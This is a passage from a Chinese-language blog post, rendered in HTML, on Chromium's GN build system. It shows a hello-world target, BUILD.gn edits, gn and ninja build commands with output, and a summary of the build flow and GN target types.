class="line">2</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~/Desktop/chromium/src/<span class="built_in">test</span>$ ls</span><br><span class="line">BUILD.gn  demo.cc</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Hello, world.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;BUILD.gn</span><br><span class="line">group(&quot;test&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    &quot;:hello_world&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">executable(&quot;hello_world&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;demo.cc&quot;,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在根目录的 <code>BUILD.gn</code>添加如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">group(&quot;gn_all&quot;) &#123;</span><br><span class="line">  testonly &#x3D; true</span><br><span class="line"></span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    ...</span><br><span class="line">    &quot;&#x2F;&#x2F;url:url_unittests&quot;,</span><br><span class="line">    &quot;&#x2F;&#x2F;test&quot;,  ——————————————&gt; 添加目录</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>然后编译就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ gn gen out&#x2F;test</span><br><span class="line">Done. Made 17759 targets from 2922 files in 5566ms</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ ninja -C out&#x2F;test hello_world</span><br><span class="line">ninja: Entering directory &#96;out&#x2F;test&#39;</span><br><span class="line">[60&#x2F;60] LINK .&#x2F;hello_world</span><br><span class="line">air@ubuntu:~&#x2F;Desktop&#x2F;chromium&#x2F;src&#x2F;test$ .&#x2F;out&#x2F;test&#x2F;hello_world </span><br><span class="line">Hello, world.</span><br></pre></td></tr></table></figure><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><ol><li>在当前目录中查找<code>.gn</code>文件并向上遍历目录树，直到找到<code>.gn</code>。将此目录设置为根目录，并解释此文件以查找生成配置文件的名称。</li><li>执行构建配置文件（这是默认工具链）。</li><li>将<code>BUILD.gn</code>文件加载到根目录中。</li><li>递归加载其他目录中的<code>BUILD.gn</code>以解析所有当前依赖项。如果在指定位置找不到生成文件，GN将在<code>tools/GN/secondary</code>内的相应位置查找</li><li>解析目标的依赖项后，将<code>.ninja</code>文件写出到磁盘。</li><li>当所有目标都解决后，写出<code>root build.ninja</code>文件。</li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>执行的第一个文件是构建配置文件。此文件的名称在标记存储库根目录的<code>.gn</code>文件中指定。在Chrome中是<code>src/build/config/BUILDCONFIG.gn</code>只有一个构建配置文件。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>目标是构建图中的一个节点。它通常代表将要生成的某种类型的可执行文件或库文件。目标取决于其他目标。内置的目标类型（请参阅<code>gn help &lt;targettype&gt;</code>以获取更多帮助）是：</p><ul><li><code>action</code>：运行一个脚本来生成一个文件。</li><li><code>action_foreach</code>：为每个源文件运行一次脚本。</li><li><code>bundle_data</code>：声明数据加入到Mac / iOS包。</li><li><code>create_bundle</code>：创建一个Mac / iOS包。</li><li><code>executable</code>：生成一个可执行文件。</li><li><code>group</code>：引用一个或多个其他目标的虚拟依赖关系节点。</li><li><code>shared_library</code>：.dll或.so。</li><li><code>loadable_module</code>：.dll或.so只能在运行时加载。</li><li><code>source_set</code>：一个轻量级的虚拟静态库（通常比真正的静态库更可取，因为它的构建速度会更快）。</li><li><code>static_library</code>：.lib或.a文件（通常你会想要一个<code>source_set</code>）。</li></ul><p>更多资料可以看官方文档。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md">https://chromium.googlesource.com/chromium/src/tools/gn/+/48062805e19b4697c5fbd926dc649c78b6aaa138/docs/language.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> makefile </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
